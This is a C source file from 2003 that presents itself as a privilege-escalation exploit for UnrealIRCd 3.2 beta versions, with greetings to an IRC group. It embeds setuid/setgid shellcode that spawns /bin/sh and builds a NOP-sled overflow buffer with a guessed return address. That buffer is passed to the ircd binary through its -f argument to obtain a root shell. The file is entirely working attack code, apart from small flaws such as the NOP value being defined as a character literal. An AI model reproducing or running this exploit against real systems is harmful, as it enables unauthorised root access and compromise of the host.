/*
 * iwS-unreal.c
 * 13/03/2003
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFFERSIZE 1181 /* 1025 + 100 + 56 */
#define NOP '0x90'  /* no-op asm code for i386 */

char    shellcode[] =   /* setuid\setgid 56bytes shellcode */
    "\x31\xc9\x31\xdb\x89\xc8\xb0\x46\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31"
    "\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
    "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

u_long  get_sp()
{
    __asm__("movl %esp, %eax");
}

void    usage(char *cmd)
{
    fprintf(stderr, "usage: %s <offset>\n", cmd);
    fprintf(stderr, "try to use 330 as offset\n\n");
    exit(-1);
}

int main(int argc, char *argv[])
{
    int i, offset;
    long    esp, ret, *addr_ptr;
    char    *buffer, *ptr, *osptr;

    printf("\nUnrealIRCd 3.2 (Selene) beta 12/13/14 exploit\n");
    printf("\tgreetZ to #iwSpub @IRCnet\n");
    printf("\tgeez! this is PRIV8! :°D\n\n");

    if (argc < 2) usage(argv[0]);
    offset = atoi(argv[1]);

    esp = get_sp();
    ret = (esp - offset);

    printf("\tESP: %#x\n", esp);
    printf("\tOFF: %#x\n", offset);
    printf("\tRET: %#x\n", ret);

    if (!(buffer = malloc(BUFFERSIZE)))
    {
        fprintf(stderr, "[!] Impossibile allocare la memoria");
        exit(-1);
    }

    ptr = buffer;
    addr_ptr = (long *)ptr;

    for (i = 0; i < BUFFERSIZE; i += 4) *(addr_ptr++) = ret;
    for (i = 0; i < BUFFERSIZE / 2; i++) buffer[i] = NOP;

    ptr = buffer + ((BUFFERSIZE / 2) - (strlen(shellcode) / 2));

    for (i = 0; i < strlen(shellcode); i ++) *(ptr++) = shellcode[i];

    buffer[BUFFERSIZE - 1] = '\0';

    execl("./ircd", "ircd", "-f", buffer, NULL);

    return 0;
}

/* _EOF_ */
